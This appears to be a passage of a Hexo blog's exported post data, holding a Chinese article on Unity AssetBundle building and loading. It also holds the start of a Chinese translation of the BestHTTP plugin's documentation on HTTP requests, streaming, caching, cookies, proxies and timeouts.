的目录）命名。也就是AssetBundleManifest\n```\n* 2 使用开发模式加载资源数据/对象,从本地进行加载时,使用 UnityEditor.AssetDatabase.LoadAssetAtPath 这个 API 即可资源数据/对象,以 UnityEngine.Object 对象返回.\n* 3 使用 AB 模式加载资源数据/对象,从本地存储加载时,使用 AssetBundles.LoadFromFile 一般情况下是将所有的资源下载到本地,然后从本地加载 AB 包,AB 包里面包含多个资源(asset),这个资源初始化之后才是可以使用的.\n```\n第一步:提前加载所有 AB 包的AssetBundleManifest,一般为所有AB包的文件夹的名字,里面包含了所有 AB 包的依赖关系\n第二步:加载单个 AB 包,在加载单个 AB 包时,从AssetBundleManifest里面获取所有的 asset 的依赖关系,获取到之后,加载依赖关系的 ab 包\n第三步:LoadAsset 加载 AB 包中的资源(asset)之后,Init 这个资源对象之后,才能然后返回给程序使用.这个初始化过后的对象才可以使用.\n\nAssetBundle.LoadFromMemoryAsync:函数,根据传入的字节(使用File.ReadAllBytes(path),将 AB 包读取为二进制)或者 CRC 值进行加载.\nAssetBundles.LoadFromFile:函数,根据路径进行从磁盘上面加载\nUnityWebRequest.GetAssetBundle 从网络上,根据路径从磁盘上面加载都可以.\n\n```\n\n* 4 \n>1 将频繁更新的对象与很少更改的对象拆分到不同的 AssetBundle 中        \n>2 将可能同时加载的对象分到一组。例如模型及其纹理和动画       \n>3 如果发现多个 AssetBundle 中的多个对象依赖于另一个完全不同的 AssetBundle 中的单个资源，请将依赖项移动到单独的 AssetBundle。如果多个 AssetBundle 引用其他 AssetBundle 中的同一组资源，一种有价值的做法可能是将这些依赖项拉入一个共享 AssetBundle 来减少重复。        \n>4 如果不可能同时加载两组对象（例如标清资源和高清资源），请确保它们位于各自的 AssetBundle 中。        \n>5 如果一个 AssetBundle 中只有不到 50% 的资源经常同时加载，请考虑拆分该捆绑包     \n>6 考虑将多个小型的（少于 5 到 10 个资源）但经常同时加载内容的 AssetBundle 组合在一起     \n>7 如果一组对象只是同一对象的不同版本，请考虑使用 AssetBundle 变体        \n\n# AB 包里面有什么\n\n*  有 2 种类型,一种是 serialized file 序列化文件(prefab,Mono,Material,shader),另一种是 resource files 真实的资源(纹理,音频,Mesh)\n*  可以使用 AssetStudio 将 ab 包里面的数据解析出来 https://github.com/Perfare/AssetStudio","source":"_posts/Unity/AssetBundles/AssetBundle.md","raw":"---\ntitle: AssetBundle 介绍\ndate: 2020-05-08 11:41:32\ncategories:\n- Unity\ntags:\n- Unity\n---\n\n\n# 概念\n* 1 AssetBundle 是一个存档文件,包含可在运行时加载的特定于平台的资源（模型、纹理、预制件、音频剪辑甚至整个场景);AssetBundle 可以表达彼此之间的依赖关系;目前一般情况下采用 LZ4 压缩方式\n* 2 AssetBundle包含 2 种东西,序列化文件和资源文件;序列化文件包含分解为各个对象并写入此单个文件的资源,依赖关系,映射等;资源文件只是为某些资源（纹理和音频）单独存储的二进制数据块，允许我们有效地在另一个线程上从磁盘加载它们.\n* 3 打包分为随包资源,以及增量包资源(热更资源).随包资源跟随 apk,ipa 进行安装;将打的增量包上传到平台资源发布(CDN)服务器,游戏内进行下载;\n\n# 本地开发使用的 API\n* 1 打 AB 包的 API,在调用 API 之前,需要给资源设置 AssetBundle 名称,可以自动也可以手动,基本上写一套自动设置名字的策略:\n```\nBuildPipeline.BuildAssetBundles(\"路径,必须是英文\", BuildAssetBundleOptions.xxx, BuildTarget.xxx);\nBuildAssetBundleOptions.None:采用LZMA压缩,不建议使用\nBuildAssetBundleOptions.UncompressedAssetBundle:不压缩,不建议使用\nBuildAssetBundleOptions.ChunkBasedCompression:采用 LZ4 的压缩方法,建议使用\n清单捆绑包:此包以其所在的目录（构建 AssetBundle 的目录）命名。也就是AssetBundleManifest\n```\n* 2 使用开发模式加载资源数据/对象,从本地进行加载时,使用 UnityEditor.AssetDatabase.LoadAssetAtPath 这个 API 即可资源数据/对象,以 UnityEngine.Object 对象返回.\n* 3 使用 AB 模式加载资源数据/对象,从本地存储加载时,使用 AssetBundles.LoadFromFile 一般情况下是将所有的资源下载到本地,然后从本地加载 AB 包,AB 包里面包含多个资源(asset),这个资源初始化之后才是可以使用的.\n```\n第一步:提前加载所有 AB 包的AssetBundleManifest,一般为所有AB包的文件夹的名字,里面包含了所有 AB 包的依赖关系\n第二步:加载单个 AB 包,在加载单个 AB 包时,从AssetBundleManifest里面获取所有的 asset 的依赖关系,获取到之后,加载依赖关系的 ab 包\n第三步:LoadAsset 加载 AB 包中的资源(asset)之后,Init 这个资源对象之后,才能然后返回给程序使用.这个初始化过后的对象才可以使用.\n\nAssetBundle.LoadFromMemoryAsync:函数,根据传入的字节(使用File.ReadAllBytes(path),将 AB 包读取为二进制)或者 CRC 值进行加载.\nAssetBundles.LoadFromFile:函数,根据路径进行从磁盘上面加载\nUnityWebRequest.GetAssetBundle 从网络上,根据路径从磁盘上面加载都可以.\n\n```\n\n* 4 \n>1 将频繁更新的对象与很少更改的对象拆分到不同的 AssetBundle 中        \n>2 将可能同时加载的对象分到一组。例如模型及其纹理和动画       \n>3 如果发现多个 AssetBundle 中的多个对象依赖于另一个完全不同的 AssetBundle 中的单个资源，请将依赖项移动到单独的 AssetBundle。如果多个 AssetBundle 引用其他 AssetBundle 中的同一组资源，一种有价值的做法可能是将这些依赖项拉入一个共享 AssetBundle 来减少重复。        \n>4 如果不可能同时加载两组对象（例如标清资源和高清资源），请确保它们位于各自的 AssetBundle 中。        \n>5 如果一个 AssetBundle 中只有不到 50% 的资源经常同时加载，请考虑拆分该捆绑包     \n>6 考虑将多个小型的（少于 5 到 10 个资源）但经常同时加载内容的 AssetBundle 组合在一起     \n>7 如果一组对象只是同一对象的不同版本，请考虑使用 AssetBundle 变体        \n\n# AB 包里面有什么\n\n*  有 2 种类型,一种是 serialized file 序列化文件(prefab,Mono,Material,shader),另一种是 resource files 真实的资源(纹理,音频,Mesh)\n*  可以使用 AssetStudio 将 ab 包里面的数据解析出来 https://github.com/Perfare/AssetStudio","slug":"Unity/AssetBundles/AssetBundle","published":1,"updated":"2020-07-27T06:29:47.622Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8czq002j2gk75uut0a01","content":"<h1 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h1><ul>\n<li>1 AssetBundle 是一个存档文件,包含可在运行时加载的特定于平台的资源（模型、纹理、预制件、音频剪辑甚至整个场景);AssetBundle 可以表达彼此之间的依赖关系;目前一般情况下采用 LZ4 压缩方式</li>\n<li>2 AssetBundle包含 2 种东西,序列化文件和资源文件;序列化文件包含分解为各个对象并写入此单个文件的资源,依赖关系,映射等;资源文件只是为某些资源（纹理和音频）单独存储的二进制数据块，允许我们有效地在另一个线程上从磁盘加载它们.</li>\n<li>3 打包分为随包资源,以及增量包资源(热更资源).随包资源跟随 apk,ipa 进行安装;将打的增量包上传到平台资源发布(CDN)服务器,游戏内进行下载;</li>\n</ul>\n<h1 id=\"本地开发使用的-API\"><a href=\"#本地开发使用的-API\" class=\"headerlink\" title=\"本地开发使用的 API\"></a>本地开发使用的 API</h1><ul>\n<li>1 打 AB 包的 API,在调用 API 之前,需要给资源设置 AssetBundle 名称,可以自动也可以手动,基本上写一套自动设置名字的策略:<pre><code>BuildPipeline.BuildAssetBundles(&quot;路径,必须是英文&quot;, BuildAssetBundleOptions.xxx, BuildTarget.xxx);\nBuildAssetBundleOptions.None:采用LZMA压缩,不建议使用\nBuildAssetBundleOptions.UncompressedAssetBundle:不压缩,不建议使用\nBuildAssetBundleOptions.ChunkBasedCompression:采用 LZ4 的压缩方法,建议使用\n清单捆绑包:此包以其所在的目录（构建 AssetBundle 的目录）命名。也就是AssetBundleManifest</code></pre></li>\n<li>2 使用开发模式加载资源数据/对象,从本地进行加载时,使用 UnityEditor.AssetDatabase.LoadAssetAtPath 这个 API 即可资源数据/对象,以 UnityEngine.Object 对象返回.</li>\n<li>3 使用 AB 模式加载资源数据/对象,从本地存储加载时,使用 AssetBundles.LoadFromFile 一般情况下是将所有的资源下载到本地,然后从本地加载 AB 包,AB 包里面包含多个资源(asset),这个资源初始化之后才是可以使用的.<pre><code>第一步:提前加载所有 AB 包的AssetBundleManifest,一般为所有AB包的文件夹的名字,里面包含了所有 AB 包的依赖关系\n第二步:加载单个 AB 包,在加载单个 AB 包时,从AssetBundleManifest里面获取所有的 asset 的依赖关系,获取到之后,加载依赖关系的 ab 包\n第三步:LoadAsset 加载 AB 包中的资源(asset)之后,Init 这个资源对象之后,才能然后返回给程序使用.这个初始化过后的对象才可以使用.\n</code></pre></li>\n</ul>\n<p>AssetBundle.LoadFromMemoryAsync:函数,根据传入的字节(使用File.ReadAllBytes(path),将 AB 包读取为二进制)或者 CRC 值进行加载.<br>AssetBundles.LoadFromFile:函数,根据路径进行从磁盘上面加载<br>UnityWebRequest.GetAssetBundle 从网络上,根据路径从磁盘上面加载都可以.</p>\n<p>```</p>\n<ul>\n<li>4 <blockquote>\n<p>1 将频繁更新的对象与很少更改的对象拆分到不同的 AssetBundle 中<br>2 将可能同时加载的对象分到一组。例如模型及其纹理和动画<br>3 如果发现多个 AssetBundle 中的多个对象依赖于另一个完全不同的 AssetBundle 中的单个资源，请将依赖项移动到单独的 AssetBundle。如果多个 AssetBundle 引用其他 AssetBundle 中的同一组资源，一种有价值的做法可能是将这些依赖项拉入一个共享 AssetBundle 来减少重复。<br>4 如果不可能同时加载两组对象（例如标清资源和高清资源），请确保它们位于各自的 AssetBundle 中。<br>5 如果一个 AssetBundle 中只有不到 50% 的资源经常同时加载，请考虑拆分该捆绑包<br>6 考虑将多个小型的（少于 5 到 10 个资源）但经常同时加载内容的 AssetBundle 组合在一起<br>7 如果一组对象只是同一对象的不同版本，请考虑使用 AssetBundle 变体        </p>\n</blockquote>\n</li>\n</ul>\n<h1 id=\"AB-包里面有什么\"><a href=\"#AB-包里面有什么\" class=\"headerlink\" title=\"AB 包里面有什么\"></a>AB 包里面有什么</h1><ul>\n<li>有 2 种类型,一种是 serialized file 序列化文件(prefab,Mono,Material,shader),另一种是 resource files 真实的资源(纹理,音频,Mesh)</li>\n<li>可以使用 AssetStudio 将 ab 包里面的数据解析出来 <a href=\"https://github.com/Perfare/AssetStudio\" target=\"_blank\" rel=\"noopener\">https://github.com/Perfare/AssetStudio</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h1><ul>\n<li>1 AssetBundle 是一个存档文件,包含可在运行时加载的特定于平台的资源（模型、纹理、预制件、音频剪辑甚至整个场景);AssetBundle 可以表达彼此之间的依赖关系;目前一般情况下采用 LZ4 压缩方式</li>\n<li>2 AssetBundle包含 2 种东西,序列化文件和资源文件;序列化文件包含分解为各个对象并写入此单个文件的资源,依赖关系,映射等;资源文件只是为某些资源（纹理和音频）单独存储的二进制数据块，允许我们有效地在另一个线程上从磁盘加载它们.</li>\n<li>3 打包分为随包资源,以及增量包资源(热更资源).随包资源跟随 apk,ipa 进行安装;将打的增量包上传到平台资源发布(CDN)服务器,游戏内进行下载;</li>\n</ul>\n<h1 id=\"本地开发使用的-API\"><a href=\"#本地开发使用的-API\" class=\"headerlink\" title=\"本地开发使用的 API\"></a>本地开发使用的 API</h1><ul>\n<li>1 打 AB 包的 API,在调用 API 之前,需要给资源设置 AssetBundle 名称,可以自动也可以手动,基本上写一套自动设置名字的策略:<pre><code>BuildPipeline.BuildAssetBundles(&quot;路径,必须是英文&quot;, BuildAssetBundleOptions.xxx, BuildTarget.xxx);\nBuildAssetBundleOptions.None:采用LZMA压缩,不建议使用\nBuildAssetBundleOptions.UncompressedAssetBundle:不压缩,不建议使用\nBuildAssetBundleOptions.ChunkBasedCompression:采用 LZ4 的压缩方法,建议使用\n清单捆绑包:此包以其所在的目录（构建 AssetBundle 的目录）命名。也就是AssetBundleManifest</code></pre></li>\n<li>2 使用开发模式加载资源数据/对象,从本地进行加载时,使用 UnityEditor.AssetDatabase.LoadAssetAtPath 这个 API 即可资源数据/对象,以 UnityEngine.Object 对象返回.</li>\n<li>3 使用 AB 模式加载资源数据/对象,从本地存储加载时,使用 AssetBundles.LoadFromFile 一般情况下是将所有的资源下载到本地,然后从本地加载 AB 包,AB 包里面包含多个资源(asset),这个资源初始化之后才是可以使用的.<pre><code>第一步:提前加载所有 AB 包的AssetBundleManifest,一般为所有AB包的文件夹的名字,里面包含了所有 AB 包的依赖关系\n第二步:加载单个 AB 包,在加载单个 AB 包时,从AssetBundleManifest里面获取所有的 asset 的依赖关系,获取到之后,加载依赖关系的 ab 包\n第三步:LoadAsset 加载 AB 包中的资源(asset)之后,Init 这个资源对象之后,才能然后返回给程序使用.这个初始化过后的对象才可以使用.\n</code></pre></li>\n</ul>\n<p>AssetBundle.LoadFromMemoryAsync:函数,根据传入的字节(使用File.ReadAllBytes(path),将 AB 包读取为二进制)或者 CRC 值进行加载.<br>AssetBundles.LoadFromFile:函数,根据路径进行从磁盘上面加载<br>UnityWebRequest.GetAssetBundle 从网络上,根据路径从磁盘上面加载都可以.</p>\n<p>```</p>\n<ul>\n<li>4 <blockquote>\n<p>1 将频繁更新的对象与很少更改的对象拆分到不同的 AssetBundle 中<br>2 将可能同时加载的对象分到一组。例如模型及其纹理和动画<br>3 如果发现多个 AssetBundle 中的多个对象依赖于另一个完全不同的 AssetBundle 中的单个资源，请将依赖项移动到单独的 AssetBundle。如果多个 AssetBundle 引用其他 AssetBundle 中的同一组资源，一种有价值的做法可能是将这些依赖项拉入一个共享 AssetBundle 来减少重复。<br>4 如果不可能同时加载两组对象（例如标清资源和高清资源），请确保它们位于各自的 AssetBundle 中。<br>5 如果一个 AssetBundle 中只有不到 50% 的资源经常同时加载，请考虑拆分该捆绑包<br>6 考虑将多个小型的（少于 5 到 10 个资源）但经常同时加载内容的 AssetBundle 组合在一起<br>7 如果一组对象只是同一对象的不同版本，请考虑使用 AssetBundle 变体        </p>\n</blockquote>\n</li>\n</ul>\n<h1 id=\"AB-包里面有什么\"><a href=\"#AB-包里面有什么\" class=\"headerlink\" title=\"AB 包里面有什么\"></a>AB 包里面有什么</h1><ul>\n<li>有 2 种类型,一种是 serialized file 序列化文件(prefab,Mono,Material,shader),另一种是 resource files 真实的资源(纹理,音频,Mesh)</li>\n<li>可以使用 AssetStudio 将 ab 包里面的数据解析出来 <a href=\"https://github.com/Perfare/AssetStudio\" target=\"_blank\" rel=\"noopener\">https://github.com/Perfare/AssetStudio</a></li>\n</ul>\n"},{"title":"BestHttp介绍1","date":"2020-05-11T03:41:32.000Z","_content":"\n# BestHttp 文档翻译\n\n## 介绍\n\n[BestHTTP](https://www.assetstore.unity3d.com/en/#!/content/10872) 是基于 [RFC 2616](https://www.w3.org/Protocols/rfc2616/rfc2616.html) 的 HTTP/1.1 实现 , 它支持几乎所有Unity移动和独立平台 (请参阅 [Supported platforms](#15)). \n\n我的目标是为Unity创建一个易于使用但功能强大的插件，以利用HTTP / 1.1中的潜力.    本文档是一个快速指南，并非所有功能和属性都可以在这里找到. 如需支持，功能请求或一般性问题，您可以发送电子邮件至besthttp@gmail.com.\n\n## 快速入门\n\n* 1:使用头文件.本文档中的所有示例都没有任何错误检查！在编写时，请确保添加一些空检查\n\n\n```\n        using BestHTTP;     \n\n```\n\n* 2:GET 请求,向Web服务器发出请求的最简单方法是创建一个HTTPRequest对象，为其构造函数提供url和回调函数.在我们构造一个新的HTTPRequest对象后，我们唯一需要做的就是使用Send()函数发送请求.\n\n```\n\n        {\n                HTTPRequest request = new HTTPRequest(new Uri(\"https://google.com\"), OnRequestFinished); request.Send(); \n\n                new HTTPRequest(new Uri(\"https://google.com\"), (request, response) => Debug.Log(\"Finished!\")).Send(); \n        }\n        void OnRequestFinished(HTTPRequest request, HTTPResponse response) \n        {    \n                Debug.Log(\"Request Finished! Text received: \" + response.DataAsText); \n        }      \n\n```\n\n\n回调函数始终接收原始HTTPRequest对象和保存服务器响应的HTTPResponse对象。如果出现错误，则HTTPResponse对象为null,需要自己判断,并且请求对象具有Exception属性,该属性可能包含有关错误的额外信息(如果有).\n虽然请求总是在不同的线程上处理，但调用回调函数已完成Unity的主线程，所以我们不必做任何线程同步。\n\n* 3:其他请求 上面的例子是简单的GET请求。如果我们没有指定方法，默认情况下所有请求都将是GET请求。构造函数具有另一个参数，可用于指定请求的方法.\n\n\n```     \n        HTTPRequest request = new HTTPRequest(new Uri(\"http://server.com/path\"), HTTPMethods.Post, OnRequestFinished); \n        request.AddField(\"FieldName\", \"Field Value\"); \n        request.Send();         \n\n```\n\n\n要在不设置字段的情况下POST任何数据，可以使用RawData属性\n\n\n\n```\n        HTTPRequest request = new HTTPRequest(new Uri(\"http://server.com/path\"), HTTPMethods.Post, OnRequestFinished); \n        request.RawData =  Encoding.UTF8.GetBytes(\"Field Value\"); \n        request.Send();         \n\n```\n\n有关其他样品，请查看[Small Code-Samples](#14)部分。\n\n除了GET和POST之外，您还可以使用 ***HEAD，PUT，DELETE，PATCH***  方法:\n\n\n```     \n        HTTPRequest request = new HTTPRequest(new Uri(\"http://server.com/path\"), HTTPMethods.Head, OnRequestFinished); \n        request.Send(); \n\n        HTTPRequest request = new HTTPRequest(new Uri(\"http://server.com/path\"), HTTPMethods.Put, OnRequestFinished); \n        request.Send(); \n\n        HTTPRequest request = new HTTPRequest(new Uri(\"http://server.com/path\"), HTTPMethods.Delete, OnRequestFinished); \n        request.Send(); \n\n        HTTPRequest request = new HTTPRequest(new Uri(\"http://server.com/path\"), HTTPMethods.Patch, OnRequestFinished); \n        request.Send(); \n\n```\n\n\n* 4:如何使用下载的数据?可以从HTTPResponse对象的Data属性访问原始字节。我们来看一个如何下载图像的例子:\n\n```\n        new HTTPRequest(new Uri(\"http://yourserver.com/path/to/image.png\"), (request, response) => \n                { \n                        var tex = new Texture2D(0, 0); \n                        tex.LoadImage(response.Data); \n                        guiTexture.texture = tex; \n                }).Send(); \n\n        new HTTPRequest(new Uri(\"http://yourserver.com/path/to/image.png\"),\n        (request, response) => guiTexture.texture = response.DataAsTexture2D).Send();   \n\n```     \n\n\n除 response.DataAsTexture2D 外，还有一个 response.DataAsText 属性可将响应解码为Utf8字符串。将来可能会添加更多数据解码属性。如果您有任何想法，请自己添加吧.\n\n* 5:替换 WWW,使用协程,一般不推荐使用这种方式\n\n\n```     \n        HTTPRequest request = new HTTPRequest(new Uri(\"http://server.com\"));\n        request.Send(); \n        yield return StartCoroutine(request); \n        Debug.Log(\"Request finished! Downloaded Data:\" + request.Response.DataAsText);  \n\n```\n\n\n\n## 高级用法\n* 1:methodType,我们将向服务器发送什么样的请求。默认的methodType是HTTPMethods.Get\n* 2:IsKeepAlive：向服务器指示我们希望tcp连接保持打开状态，因此连续的http请求不需要再次建立连接。如果我们将它保留为默认值true，它可以为我们节省大量时间。如果我们知道我们不会使用通常会将其设置为false的请求。默认值是true。\n* 3:disableCache：告诉BestHTTP系统使用或完全跳过缓存机制。如果其值为true，则系统不会检查缓存中是否存储了响应，并且也不会保存响应。默认值为false\n* 4:请求一次:\n\n\n```     \n        public static void RequestAsyncShort(string url, RequestCallBack callBack)\n        {\n                BestHTTP.HTTPRequest req = new HTTPRequest(new Uri(url), HTTPMethods.Get, \n                (originalRequest, response) =>\n                {\n                        if (originalRequest.State == HTTPRequestStates.Finished)\n                        {\n                        callBack((int) originalRequest.State, response.DataAsText);\n                        }\n                        else\n                        {\n                        callBack((int) originalRequest.State, \"\");\n                        }\n                });\n                req.IsKeepAlive = false;\n                req.DisableCache = true;\n                req.Send();\n        }           \n\n```\n\n* 5:Best HTTP通过HTTPRequest的Credentials属性支持Basic和Digest身份验证：\n\n\n```\n        using BestHTTP.Authentication; \n        var request = new HTTPRequest(new Uri(\"http://yourserver.org/auth-path\"), (req, resp) => \n                { \n                        if (resp.StatusCode != 401) \n                                Debug.Log(\"Authenticated\"); \n                        else \n                                Debug.Log(\"NOT Authenticated\"); \n                        Debug.Log(resp.DataAsText); \n                }); \n        request.Credentials = new Credentials(\"usr\", \"paswd\"); \n        request.Send();                 \n\n```\n\n\n* 6:下载流媒体(Download Streaming)\n默认情况下，当完全下载并处理服务器的答案时，我们提供给HTTPRequest的构造函数的回调函数将只调用一次。这样，如果我们想要下载更大的文件，我们就会在移动设备上快速耗尽内存。我们的应用程序会崩溃，用户会对我们生气，应用程序会得到很多不好的评级。理所当然。为了避免这种情况，BestHTTP旨在非常容易地处理这个问题：只需将一个标志(属性)切换为true，每次下载预定义数据量时(指定内存中缓存多少字节量)都会调用我们的回调函数。此外，如果我们没有关闭缓存，下载的响应将被缓存，以便下次我们可以从本地缓存流式传输整个响应，而无需更改我们的代码，甚至无需访问Web服务器。 （备注：服务器必须发送有效的缓存头（“Expires”头：请参阅[RFC](https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.21)以允许此操作。）\n\n\n```     \n        var request = new HTTPRequest(new Uri(\"http://yourserver.com/bigfile\"), (req, resp) => \n        { \n                List<byte[]> fragments = resp.GetStreamedFragments(); \n                // Write out the downloaded data to a file: \n                using (FileStream fs = new FileStream(\"pathToSave\", FileMode.Append)) {\n                        foreach(byte[] data in fragments) fs.Write(data, 0, data.Length); \n                }\n                if (resp.IsStreamingFinished) Debug.Log(\"Download finished!\"); \n        }); \n        request.UseStreaming = true; \n        request.StreamFragmentSize = 1 * 1024 * 1024; // 1 megabyte\n        request.DisableCache = true; // already saving to a file, so turn off caching request.Send(); \n                \n```\n\n\n>>>\n        1):我们将标志 - UseStreaming - 切换为true，因此我们的回调可能被调用多次。\n        2):StreamFragmentSize指示在调用回调之前我们想要在内存中缓冲的最大数据量。\n        3):每次下载StreamFragmentSize大小的块时都会调用我们的回调，并且当IsStreamingFinished设置为true时再调用一次。\n        4):要获取下载的数据，我们必须使用GetStreamedFragments()函数。我们应该将结果保存在临时变量中，因为在此调用中清除了内部缓冲区(返回字节量,清除内存,写入文件)，因此连续调用将为我们提供null结果。\n        5):我们在此示例中禁用了缓存，因为我们已经保存了下载的缓存,保存在一个磁盘文件中，并且我们不想占用太多空间。\n>>>\n\n\n下载进度\n\n\n```\n        var request = new HTTPRequest(new Uri(address), OnFinished); \n        request.OnProgress = OnDownloadProgress; \n        request.Send(); \n        void OnDownloadProgress(HTTPRequest request, int downloaded, int length) \n        { \n                float progressPercent = (downloaded / (float)length) * 100.0f;\n                Debug.Log(\"Downloaded: \" + progressPercent.ToString(\"F2\") + \"%\"); \n        } \n\n```\n\n\n* 7:上传流媒体(Upload Streaming)\n使用HTTPRequest对象的UploadStream属性设置上传的数据流Stream。当上传完成并且DisposeUploadStream为true时，插件将调用Stream流上的Dispose()函数。如果流的长度未知，则UseUploadStreamLength属性应设置为false。在这种情况下，插件将使用分块传输编码从流中发送数据:\n\n\n```\n        var request = new HTTPRequest(new Uri(address), HTTPMethods.Post, OnUploadFinished); \n        request.UploadStream = new FileStream(\"File_To.Upload\", FileMode.Open); \n        request.Send(); \n\n```\n\n\n上传进度回调,要跟踪和显示上传进度，您可以使用HTTPRequest类的OnUploadProgress事件。 OnUploadProgress可以与RawData，表单（通过AddField和AddBinaryData）以及UploadStream一起使用。\n\n\n```\n        var request = new HTTPRequest(new Uri(address), HTTPMethods.Post, OnFinished); \n        request.RawData =  Encoding.UTF8.GetBytes(\"Field Value\");\n        request.OnUploadProgress = OnUploadProgress; \n        request.Send(); \n        void OnUploadProgress(HTTPRequest request, long uploaded, long length)\n        { \n                float progressPercent = (uploaded / (float)length) * 100.0f;\n                Debug.Log(\"Uploaded: \" + progressPercent.ToString(\"F2\") + \"%\"); \n        }\n                \n```\n\n* 8:缓存\n\n缓存也基于HTTP / 1.1 RFC。它使用标头来存储和验证响应。缓存机制在幕后工作，我们唯一要做的就是决定是否要启用或禁用它。如果缓存的响应具有带有未来日期的“Expires”标头，则BestHTTP将使用缓存的响应，而不对服务器进行验证。这意味着我们不必启动与服务器的任何tcp连接。这可以节省我们的时间，带宽和离线工作。 ***(这段话的意思相当于本地数据缓存,请求服务器,不会真的连接服务器,会从本地取出原来已经请求过的数据,只要这个数据没有过期,则直接返回给使用者)***\n\n\n虽然缓存是自动的，但我们可以控制它，或者我们可以使用HTTPCacheService类的公共函数获取一些信息：\n>>>\n        1):BeginClear(),它将开始在单独的线程上清除整个缓存\n        2):BeginMaintainence(),有了这个函数的帮助，我们可以根据上次访问时间删除缓存的条目。它删除上次访问时间早于指定时间的条目。我们还可以使用此函数来控制缓存大小：\n                HTTPCacheService.BeginMaintainence(new HTTPCacheMaintananceParams(TimeSpan.FromDays(14), 50 * 1024 * 1024)); \n        3):GetCacheSize(),将以字节为单位返回缓存的大小。\n        4):GetCacheEntryCount(),将返回缓存中存储的条目数。可以使用float avgSize = GetCacheSize()/（float）GetCacheEntryCount()公式计算平均缓存条目大小。\n>>>\n\n\n* 9:Cookie ,处理cookie操作对程序员来说是透明的。设置请求Cookie标头以及解析和维护响应的Set-Cookie标头由插件自动完成。有很多关于cookie的Global Settings 。有关详细信息，请参阅 [Global Settings](#13) 部分。\n它可以以各种方式控制\n\n>>>\n        1):使用每一次的请求对象HTTPRequest.IsCookiesEnabled属性以及全局的HTTPManager.IsCookiesEnabled属性来禁用\n        2):可以通过调用CookieJar.Clear()函数从Cookie Jar中删除Cookie\n        3):可以通过响应的Cookies属性访问从服务器发送的新cookie。\n>>>\n\n可以通过将Cookie添加到Cookie列表中将Cookie添加到HTTPRequest：\n\n```\n        var request = new HTTPRequest(new Uri(address), OnFinished);\n        request.Cookies.Add(new Cookie(\"Name\", \"Value\")); \n        request.Send(); \n\n```\n\n\n这些cookie将与服务器发送的cookie合并。如果在请求或HTTPManager中将IsCookiesEnabled设置为false，则仅发送这些用户设置的cookie\n\n* 10:代理,HTTPProxy对象可以设置为HTTPRequest的Proxy属性。这样，请求将通过给定的代理。\n\n```\n        request.Proxy = new HTTPProxy(new Uri(\"http://localhost:3128\")); \n\n```\n\n\n您也可以设置全局代理，因此您不必手动将其设置为所有请求。请参阅[Global Settings](#13)一章\n\n* 11:终止请求,您可以通过调用HTTPRequest对象的Abort（）函数来中止正在进行的请求\n\n\n```\n        request = new HTTPRequest(new Uri(\"http://yourserver.com/bigfile\"), (req, resp) => { ... }); \n        request.Send(); \n        // And after some time: \n        request.Abort(); //将调用回调函数，并且响应对象(resp)将为null。\n```\n\n\n* 12:超时,2 种情况,第一种是:ConnectTimeout,使用此属性，您可以控制等待在应用程序和远程服务器之间建立连接的时间。其默认值为20秒\n\n```\n        request = new HTTPRequest(new Uri(\"http://yourserver.com/\"), (req, resp) => { ... }); \n        request.ConnectTimeout = TimeSpan.FromSeconds(2); \n        request.Send(); \n\n```\n第二种:Timeout 使用此属性，您可以控制等待处理请求的时间（此时已连接到服务器,正在等待服务器响应,发送请求和下载响应）。其默认值为60秒。\n\n\n```\n        request = new HTTPRequest(new Uri(\"http://yourserver.com/\"), (req, resp) => { ... }); \n        request.Timeout = TimeSpan.FromSeconds(10); \n        request.Send(); \n\n\n\n        string url = \"http://besthttp.azurewebsites.net/api/LeaderboardTest?from=0&count=10\"; \n        HTTPRequest request = new HTTPRequest(new Uri(url), (req, resp) => \n        { \n                switch (req.State) \n                { \n                        // The request finished without any problem. \n                        case HTTPRequestStates.Finished: \n                                Debug.Log(\"Request Finished Successfully!\\n\" + resp.DataAsText); \n                                break; \n                                // The request finished with an unexpected error. \n                        // The request's Exception property may contain more information about the error. \n                        case HTTPRequestStates.Error: \n                                Debug.LogError(\"Request Finished with Error! \" + (req.Exception != null ? (req.Exception.Message + \"\\n\" + req.Exception.StackTrace) : \"No Exception\")); \n                        break; \n                        // The request aborted, initiated by the user. \n                        case HTTPRequestStates.Aborted: \n                                Debug.LogWarning(\"Request Aborted!\"); \n                        break; \n                        // Ceonnecting to the server timed out. \n                        case HTTPRequestStates.ConnectionTimedOut: \n                                Debug.LogError(\"Connection Timed Out!\"); \n                        break; \n                        // The request didn't finished in the given time. \n                        case HTTPRequestStates.TimedOut: \n                                Debug.LogError(\"Processing the request Timed Out!\"); break; \n                } \n        }); \n        // Very little time, for testing purposes: \n        request.ConnectTimeout = TimeSpan.FromMilliseconds(2); \n        request.Timeout = TimeSpan.FromSeconds(5); \n        request.IsKeepAlive = false; \n        request.DisableCache = true; \n        request.Send(); \n\n```\n\n* 13:Request States 请求状态,所有请求都有一个包含其内部状态的State属性。可能的状态如下：\n\n>>>\n        1):Initial:请求的初始状态。使用此状态不会调用任何回调\n        2):Queued:在队列中等待处理。使用此状态不会调用任何回调\n        3):Processing:开始处理请求。在此状态下，客户端将发送请求，并解析响应。使用此状态不会调用任何回调。\n        4):Finished:请求完成没有问题。解析完成的响应后，可以使用结果。将使用有效的响应对象调用用户定义的回调。请求的Exception属性将为null。\n        5):Error:请求在插件中以意外错误结束。将使用null响应对象调用用户定义的回调。请求的Exception属性可能包含有关错误的更多信息，但它可以为null。\n        6):Aborted: 请求由客户端中止（HTTPRequest的Abort（）函数）。将使用null响应调用用户定义的回调。请求的Exception属性将为null。\n        7):ConnectionTimedOut：连接到服务器超时。将使用null响应调用用户定义的回调。请求的Exception属性将为null。\n        8):TimedOut：请求未在给定时间内完成。将使用null响应调用用户定义的回调。请求的Exception属性将为null。\n>>>\n\n\n* 14:请求的优先级Request Priority ,可以通过HTTPRequest的Priority属性更改请求的优先级。与较低优先级请求相比，将从请求队列中选择更高优先级的请求。\n\n```\n        var request = new HTTPRequest(new Uri(\"https://google.com\"), ...);\n        request.Priority = -1; \n        request.Send(); \n\n```\n\n\n* 15:服务器证书验证,Server Certificate  Validation 可以通过实现ICertificateVerifyer接口并将其设置为HTTPRequest的CustomCertificateVerifyer来验证服务器发送的证书：\n\n\n```\n        using System; \n        using 